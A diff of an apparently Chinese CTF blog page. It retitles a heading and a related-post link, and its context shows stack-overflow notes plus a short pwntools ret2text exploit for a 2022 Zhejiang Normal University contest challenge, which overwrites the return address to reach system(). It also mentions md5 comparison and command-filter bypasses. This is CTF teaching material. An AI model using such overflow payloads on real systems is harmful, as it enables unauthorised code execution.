@@ -300,7 +300,7 @@
 
 <h1><span id="payload构造">payload构造</span></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.get(),read(),scanf()为溢出的切入口</span><br><span class="line">2.查看system()地址</span><br><span class="line">	a.start后面的内容</span><br><span class="line">	b.push地址</span><br><span class="line">3.装满后64&gt;8,32&gt;4</span><br><span class="line">4.栈溢出的功能:</span><br><span class="line">	a.获取到system()</span><br><span class="line">	b.改变变量的值</span><br></pre></td></tr></table></figure>
 
-<h1><span id="例题解析">例题解析</span></h1><h2><span id="2022zjnubabyrop">2022zjnubabyrop</span></h2><p>[<a href="https://ctf.a1natas.com/games/1/challenges">复现] 2022 第二届浙江师范大学网络与信息安全竞赛 - A1::CTF (a1natas.com)</a></p>
+<h1><span id="知识点分析">知识点分析</span></h1><h1><span id="例题解析">例题解析</span></h1><h2><span id="2022zjnubaby_rop">2022zjnubaby_rop</span></h2><p>[<a href="https://ctf.a1natas.com/games/1/challenges">复现] 2022 第二届浙江师范大学网络与信息安全竞赛 - A1::CTF (a1natas.com)</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器,64位程序</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x401196</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 	
@@ -474,8 +474,8 @@ misc0x05. 明文攻击
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="2021 第一届浙江师范大学网络安全与信息安全竞赛">
-								2021 第一届浙江师范大学网络安全与信息安全竞赛			
+							<a class="relate-post-title" href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="write_up">
+								write_up			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
@@ -485,14 +485,25 @@ misc0x05. 明文攻击
 								
 
 
-easy_md512345678910111213141516171819202122232425262728&lt;?phpshow_source(__FILE__);error_reporting(0);if($_GET[&...
+
+2021 第一届浙江师范大学网络安全与信息安全竞赛
+easy_md5
+md5绕过
+弱等于(&#x3D;&#x3D;)
+强等于(&#x3D;&#x3D;&#x3D;)
+
+
+禁止符绕过
+%20
+一般禁止(cat flag)
+通过字...
 							</p>
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="2021 第一届浙江师范大学网络安全与信息安全竞赛">				
+							<a href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="write_up">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="2021 第一届浙江师范大学网络安全与信息安全竞赛"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="write_up"/>
 							</a>
 						</div>
 					</li>												
